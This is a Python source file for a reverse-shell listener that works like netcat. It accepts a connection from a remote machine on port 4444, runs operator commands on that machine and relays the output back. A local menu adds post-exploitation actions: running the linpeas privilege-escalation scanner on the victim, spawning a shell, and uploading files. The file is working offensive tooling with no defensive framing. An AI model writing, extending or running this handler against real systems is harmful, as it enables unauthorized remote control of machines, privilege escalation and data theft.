#!/usr/bin/env python3
from libs.help import Help
from libs.lhost import Lhost
from libs.rhost import Rhost
import socket
import sys, os
import subprocess


class netcatServ(object):
    listener = False
    clientHandler = False
    prompt = False
    port = 4444
    target = ""
    bufferSize = 2**12

    def main(self):

        listArgs = Lhost.args(sys.argv)

        if not len(sys.argv[1:]):
            Help.usageOff()
        for opt in listArgs:
            if opt == "listen%" or opt == "l%" or opt == "listen" or opt == "l":
                self.listener = True

            elif opt == "h%" or opt == "help%" or opt == "help" or opt == "h":
                Help.usageOff()

            elif "p%" in opt or "   port%" in opt:
                opts = opt.split("%")
                self.port = int(opts[1])

            elif "target%" in opt:
                opts = opt.split("%")
                self.target = opts[1]

            elif opt == "prompt%" or opt == "prompt":
                self.clientHandler = True

            else:
                Help.usageOff()

        if self.listener:
            self.serverLoop()
        if self.clientHandler:
            self.clientLoop()

    def serverLoop(self):
        local = False
        conn,addr = Lhost.binding(self.target,self.port)
        print("[+] Connection from : ",addr)
        print("\nType help if you want some tips ! \n")
        while True:
            if local == False:
                home,user,tag = Rhost.init(conn)
                Rhost.getDir(conn)
                try:
                    command = input('\033[31m'+"(remote) \x1b[0m\033[93m\033[1m%s\x1b[0m\033[93m@[%s] %s "%(user,home,tag) + '\x1b[0m')

                    if 'clear' in command:
                        os.system('clear')

                    elif 'exit' in command or 'quit' in command or 'terminate' in command:
                        conn.send(b'exit')
                        conn.close()
                        break
                    elif 'cd' in command:
                        conn.send(command.encode())
                        recv = conn.recv(self.bufferSize).decode()
                        if "This folder doesn't exist" in recv:
                            print(recv)
                        else:
                            self.home = recv
                    elif command == "":
                        print('')
                    elif command == "local":
                        local = True
                        Help.usageOn()
                    else:
                        print("\033[0;94m PLEASE WAIT ... \x1b[0m")
                        conn.send(command.encode())
                        fini = "false"
                        while fini == "false":
                            recv = conn.recv(self.bufferSize).decode()
                            if "not found" in recv:
                                print("This command don't exist !")
                            else:
                                print(recv)
                            if len(recv) < self.bufferSize:
                                fini = "true"
                except KeyboardInterrupt:
                    print('\n')

            else:
                home,user,tag = Lhost.init()
                Lhost.getDir()
                try:
                    command = input('\033[31m'+"(local) \x1b[0m\033[93m\033[1m%s\x1b[0m\033[93m@[%s] %s "%(user,home,tag) + '\x1b[0m')
                    if 'help' in command:
                        Help.usageOn()
                    elif command == "linpeas":
                        print(conn)
                        Rhost.linpeas(conn)
                    elif command == "shell":
                        Rhost.shell(conn)
                        conn.recv(self.bufferSize).decode()
                    elif "upload " in command:
                        param = command.split(" ")
                        param = param[1:]
                        try:
                            Rhost.upload(conn,param[0],param[1])
                        except IndexError:
                            print("Error ! Missing one argument !")
                    elif command == "exit":
                        local = False
                    elif command == "clear":
                        os.system("clear")
                    elif "cd " in command:
                        param = command.split(' ')
                        param = ''.join(param[1:])
                        try:
                            os.chdir(param)
                        except:
                            print("Error !")
                    else:
                        os.system(command)
                except KeyboardInterrupt:
                    print('\n')

if __name__ == "__main__":
   ncat = netcatServ()
   ncat.main()
